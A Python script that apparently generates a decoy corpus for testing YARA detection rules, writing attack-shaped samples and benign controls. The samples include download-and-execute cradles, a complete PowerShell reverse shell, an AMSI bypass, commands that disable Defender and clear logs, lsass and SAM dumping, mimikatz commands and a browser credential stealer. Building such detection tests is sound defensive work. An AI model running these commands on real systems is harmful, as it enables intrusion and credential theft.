"""Synthetic decoy corpus for the YARA rule set. Everything is defanged:
fake PE/MDMP/regf/kirbi headers carrying marker strings, RFC 5737 addresses,
no working payloads. Files named <category>_* must fire, benign_* must not."""
import base64, io, os, struct, sys, zipfile

OUT = sys.argv[1]
PKG = sys.argv[2]
os.makedirs(OUT, exist_ok=True)
for f in os.listdir(OUT):
    os.remove(os.path.join(OUT, f))

def W(name, text):
    with open(os.path.join(OUT, name), 'w', encoding='utf-8', newline='') as fh:
        fh.write(text)

def W16(name, text):
    with open(os.path.join(OUT, name), 'wb') as fh:
        fh.write(text.encode('utf-16-le'))

def WB(name, data):
    with open(os.path.join(OUT, name), 'wb') as fh:
        fh.write(data)

def Z(n):
    return b'\x00' * n

def fake_pe(strings, wide=False):
    b = b'MZ' + Z(62)
    for s in strings:
        b += Z(4) + (s.encode('utf-16-le') if wide else s.encode('ascii'))
    return b + Z(64)

def u16(s):
    return s.encode('utf-16-le')

def read(name):
    with open(os.path.join(PKG, name), 'r', encoding='utf-8', errors='replace') as fh:
        return fh.read()

# ------------------------------------------------------------ LNK (hand-built)
def make_lnk(args):
    # ShellLinkHeader (76 bytes) + StringData: NAME? no. We set LinkFlags HasArguments|HasRelativePath|IsUnicode.
    flags = 0x00000020 | 0x00000008 | 0x00000080   # HasArguments | HasRelativePath | IsUnicode
    hdr = struct.pack('<I', 0x4C) + bytes.fromhex('0114020000000000c000000000000046')
    hdr += struct.pack('<I', flags) + struct.pack('<I', 0x20)          # FileAttributes
    hdr += Z(8 * 3) + struct.pack('<I', 0) + struct.pack('<I', 1)      # times, size, icon index
    hdr += struct.pack('<I', 1) + struct.pack('<H', 0) + Z(2) + Z(8)   # showcmd, hotkey, reserved
    def sd(s):
        return struct.pack('<H', len(s)) + u16(s)
    rel = '..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
    return hdr + sd(rel) + sd(args)

WB('ia_lnk_payload.lnk', make_lnk("-w hidden -nop -c \"iex (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')\""))
WB('benign_powershell.lnk', make_lnk('-NoExit -Command Get-Date'))

# ------------------------------------------------------------ 01 initial access
W('ia_hta_dropper.hta', '''<html><head><HTA:APPLICATION ID="x" WINDOWSTATE="minimize"></head>
<script language="VBScript">
Set sh = CreateObject("WScript.Shell")
sh.Run "powershell -w hidden -c iex(iwr http://198.51.100.7/p.ps1)", 0
self.close
</script></html>
''')

W('ia_js_dropper.js', '''var x = new ActiveXObject("MSXML2.XMLHTTP");
x.open("GET", "http://198.51.100.7/update.exe", false); x.send();
var s = new ActiveXObject("ADODB.Stream"); s.Type = 1; s.Open(); s.Write(x.responseBody);
s.SaveToFile("C:\\\\Users\\\\Public\\\\update.exe", 2);
new ActiveXObject("WScript.Shell").Run("C:\\\\Users\\\\Public\\\\update.exe");
''')

W('ia_clickfix.html', '''<html><body><div class="captcha">Verify you are human</div>
<script>
function v(){ const c = "powershell -w hidden -c \\"irm https://check.example-verify.top/v.txt | iex\\" # I am not a robot - reCAPTCHA Verification ID: 7811";
navigator.clipboard.writeText(c); }
</script></body></html>
''')

with open(os.path.join(os.environ['SystemRoot'], 'System32', 'calc.exe'), 'rb') as fh:
    calc_b64 = base64.b64encode(fh.read()).decode()
W('ia_b64_exe.txt', '$p = "%s"\r\n[IO.File]::WriteAllBytes($env:TEMP + \'\\x.exe\', [Convert]::FromBase64String($p))' % calc_b64)

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr('a.txt', 'hello')
zb = base64.b64encode(buf.getvalue()).decode()
W('ia_html_smuggle.html', '''<!DOCTYPE html><html><body><script>
var b = atob("%s"); var a = new Uint8Array(b.length); for (var i=0;i<b.length;i++){a[i]=b.charCodeAt(i);}
var blob = new Blob([a], {type:'application/octet-stream'}); var l = document.createElement('a');
l.href = URL.createObjectURL(blob); l.download = 'Invoice_2026.zip'; l.click();
</script></body></html>
''' % zb)

W('ia_svg_smuggle.svg', '''<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><script type="text/javascript">
var u = atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvbG9naW4="); window.location.href = u;
</script></svg>
''')

W('ia_rtf_equation.rtf', r'{\rtf1\ansi{\object\objemb\objupdate{\*\objclass Equation.3}{\*\objdata 01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1b11ae1}}}')

one = bytes.fromhex('e4525c7b8cd8a74daeb15378d02996d3') + Z(64) + bytes.fromhex('bde316e7266545 11a4c48d4d0b7a9eac'.replace(' ', '')) + Z(20) + b'MZ' + Z(64)
WB('ia_onenote_pe.one', one)

ole = bytes.fromhex('d0cf11e0a1b11ae1') + Z(24) + u16('WordDocument') + Z(8) + u16('_VBA_PROJECT') + Z(8) + \
      b'Attribute VB_Name = "ThisDocument"\r\nSub AutoOpen()\r\nShell("cmd /c powershell -enc AAAA")\r\nEnd Sub'
WB('ia_office_macro.doc', ole)

# ------------------------------------------------------------ 02 powershell / lolbas
W('ps_cradle.ps1', "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/stage2.ps1')")
W('ps_irm_iex.txt', 'irm https://198.51.100.7/x | iex')
enc = base64.b64encode(u16("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/s.ps1')")).decode()
W('ps_enc.bat', '@echo off\r\npowershell.exe -nop -w hidden -enc ' + enc)
W16('ps_enc_task.xml', '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Actions><Exec><Command>powershell.exe</Command><Arguments>-w hidden -enc %s</Arguments></Exec></Actions></Task>' % enc)
W('ps_revshell.ps1', "$client = New-Object System.Net.Sockets.TCPClient('198.51.100.7',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
W('ps_amsi.ps1', "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)")
W('ps_defender.ps1', 'Set-MpPreference -DisableRealtimeMonitoring $true\r\nAdd-MpPreference -ExclusionPath C:\\Users\\Public\\x')
W('ps_logging.ps1', 'wevtutil cl Security\r\nSet-ItemProperty -Path HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0')
W('ps_reflective.ps1', '$a=[Reflection.Assembly]::Load([Convert]::FromBase64String($blob)); $a.EntryPoint.Invoke($null,$null)')
W('ps_obf.ps1', "&('{2}{0}{1}{3}{4}{5}{6}' -f 'nv','o','I','ke','-Ex','pre','ssion') (('{0}{1}' -f 'wh','oami'))\r\nI`E`X (\"abc\"); Inv`oke-Expression 'x'")
W('ps_stealth.txt', 'powershell.exe -nop -w hidden -ep bypass -c "iwr http://198.51.100.7/a.ps1 -o $env:TEMP\\a.ps1"')
W('lol_certutil.bat', 'certutil.exe -urlcache -split -f http://198.51.100.7/a.exe %TEMP%\\a.exe && start %TEMP%\\a.exe')

# ------------------------------------------------------------ 03 credential access
WB('cred_lsass.dmp', b'MDMP' + Z(64) + u16('C:\\Windows\\System32\\lsass.exe') + Z(8) + u16('C:\\Windows\\System32\\lsasrv.dll'))
WB('cred_system.hiv', b'regf' + Z(44) + u16('stemRoot\\System32\\Config\\SYSTEM') + Z(9000) + b'ControlSet001')
WB('benign_ntuser.dat', b'regf' + Z(44) + u16('??\\C:\\Users\\x\\ntuser.dat') + Z(9000) +
   b'Software Control Panel powershell -w hidden -enc AAAA iex sekurlsa::logonpasswords privilege::debug')
WB('cred_ticket.kirbi', bytes([0x76, 0x82, 0x05, 0x10, 0x30, 0x82]) + Z(40) + b'krbtgt' + Z(1200))
W('cred_mimi_out.txt', 'Authentication Id : 0 ; 996 (00000000:000003e4)\r\nSession : Interactive from 1\r\n* Username : admin\r\n* Domain : CORP\r\n* NTLM : 8846f7eaee8fb117ad06bdd830b7586c\r\nmsv :\r\n [00000003] Primary')
W('cred_hashes.txt', 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\r\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\r\nuser:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::')
W('cred_mimikatz.txt', 'privilege::debug\r\nsekurlsa::logonpasswords')
W('cred_procdump.cmd', 'procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp')
W('cred_stealer.py', "import sqlite3, win32crypt, requests\r\np = os.path.join(local, r'Google\\Chrome\\User Data\\Default\\Login Data')\r\nv = win32crypt.CryptUnprotectData(blob)\r\nrequests.post('https://api.telegram.org/bot123456789:AAHfiqksKZ8WmR2zSjiQ7_v4TMAKdiHm9T0/sendDocument')")
W('cred_regsave.bat', 'reg save HKLM\\SAM C:\\Users\\Public\\sam.hiv && reg save HKLM\\SYSTEM C:\\Users\\Public\\sys.hiv')

# ------------------------------------------------------------ 04 known offensive tools
WB('tool_cs_beacon.bin', fake_pe(['beacon.x64.dll', '%s as %s\\%s: %d', 'ReflectiveLoader']))
WB('tool_sliver.bin', fake_pe(['github.com/bishopfox/sliver/implant/sliver', 'sliverpb.Envelope']))
WB('tool_metsrv.bin', fake_pe(['metsrv.dll', 'ext_server_stdapi.x64.dll']))
W('tool_powerview.ps1', 'function Get-DomainUser {\r\n param() }\r\nGet-DomainUser -Identity x')
W('tool_rubeus.txt', 'Rubeus.exe kerberoast /user:svc_sql /outfile:hashes.txt')
WB('tool_rubeus.bin', fake_pe(['Rubeus', 'GhostPack'], wide=True))
W('tool_entra.ps1', 'Import-Module AADInternals\r\nGet-AADIntAccessTokenForAADGraph')
WB('tool_potato.bin', fake_pe(['PrintSpoofer', 'SeImpersonatePrivilege']))
# The BYOVD rule parses the real VS_VERSION_INFO through the pe module, so the decoy
# must be a real driver: take Windows' own null.sys and rename its OriginalFilename
# value to a blocklisted driver of the same length (null.sys -> gdrv.sys).
with open(os.path.join(os.environ['SystemRoot'], 'System32', 'drivers', 'null.sys'), 'rb') as fh:
    nul = fh.read()
key = 'OriginalFilename'.encode('utf-16-le') + b'\x00\x00'
i = nul.find(key)
j = nul.lower().find('ull.sys'.encode('utf-16-le'), i)
if i < 0 or j < 0:
    raise SystemExit('null.sys layout unexpected; cannot build tool_driver.sys decoy')
j -= 2  # back to the 'n'/'N'
WB('tool_driver.sys', nul[:j] + 'gdrv.sys'.encode('utf-16-le') + nul[j + 16:])

# ------------------------------------------------------------ 05 persistence
W16('persist_task.xml', '<?xml version="1.0" encoding="UTF-16"?><Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Actions Context="Author"><Exec><Command>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command><Arguments>-w hidden -File C:\\Users\\bob\\AppData\\Roaming\\upd.ps1</Arguments></Exec></Actions></Task>')
W16('benign_yara_task.xml', read('YARA-Quick.xml'))
W('persist_wmi.ps1', '''$f = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{Name='u';EventNameSpace='root\\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$c = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name='u';CommandLineTemplate="powershell -w hidden -enc AAAA"}
Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c}
''')
WB('persist_objects.data', Z(16) + b'CommandLineEventConsumer\x00\x00Updater\x00\x00powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\x00\x00')
W('persist_runkey.ps1', "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name Updater -Value 'powershell -w hidden -File C:\\Users\\bob\\AppData\\Roaming\\u.ps1'")
W('persist_startup.bat', 'copy %TEMP%\\u.vbs "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\u.vbs"')

# ------------------------------------------------------------ 06 remote access / exfil
W('rat_client32.ini', '[Client]\r\nGatewayAddress=198.51.100.7:443\r\nSecurityKey2=ABCDEF\r\nLicensee=MGC\r\nsilent=1')
WB('rat_asyncrat.bin', fake_pe(['AsyncRAT', 'get_SslClient', 'get_SendSync']))
W('rmm_anydesk_user.conf', 'ad.anynet.id=123456789\r\nad.anynet.alias=x@ad\r\nad.roster.items=\r\nad.security.permission_profile=x')
W('rmm_rustdesk2.toml', "rendezvous_server = 'rs.example.net'\r\nnat_type = 1\r\nserial = 3\r\n[options]\r\ncustom-rendezvous-server = 'rs.example.net'\r\nkey = 'abc'")
W('rmm_meshagent.msh', 'MeshName=lab\r\nMeshType=2\r\nMeshID=0x1234\r\nServerID=ABCD\r\nMeshServer=wss://mesh.example.net:443/agent.ashx')
WB('tunnel_chisel.bin', fake_pe(['github.com/jpillora/chisel/share']))
WB('tunnel_ngrok.bin', fake_pe(['ngrok', 'NGROK_AUTHTOKEN']))
W('exfil_rclone.conf', '[mega]\r\ntype = mega\r\nuser = a@b.c\r\npass = xyz')
WB('exfil_rclone.bin', fake_pe(['rclone', 'github.com/rclone/rclone/fs']))
W('exfil_webhook.js', "fetch('https://discord.com/api/webhooks/123456789012345678/" + 'a' * 68 + "')")

# ------------------------------------------------------------ 07 unwanted tools
WB('pua_dcontrol.bin', fake_pe(['Defender Control', 'www.sordum.org'], wide=True))
WB('pua_kms.bin', fake_pe(['KMSAuto Net', 'KMSServer'], wide=True))
W('expectedfp_claude_installer.txt', 'irm https://claude.ai/install.ps1 | iex')
WB('pua_nirsoft.bin', fake_pe(['http://www.nirsoft.net', 'WebBrowserPassView'], wide=True))
WB('pua_psexec.bin', fake_pe(['PsExec', 'PSEXESVC', 'Sysinternals'], wide=True))

# ------------------------------------------------------------ benign controls
W('benign_script.ps1', 'Get-Process | Where-Object { $_.CPU -gt 10 } | Select Name\r\nInvoke-WebRequest -Uri https://aka.ms/x -OutFile x.msi\r\n# this script demonstrates iex usage')
W('benign_install.ps1', read('install.ps1'))
W('benign_scanquick.ps1', read('scan-quick.ps1'))
W('benign_html.html', "<!DOCTYPE html><html><body><svg xmlns='http://www.w3.org/2000/svg'><path d='M0'/></svg><script>eval('1'); location.href='/x'; atob('aa');</script><a download='report.xlsx'></a></body></html>")
W('benign_vendor_task.xml', '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Actions><Exec><Command>%localappdata%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe</Command></Exec></Actions></Task>')
W('benign_noise.txt', 'The quick brown fox mentions iex, powershell, mimikatz and Rubeus in passing but has no attack shape.')
W('expectedfp_chocolatey.txt', "Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))")

print('decoys:', len(os.listdir(OUT)))
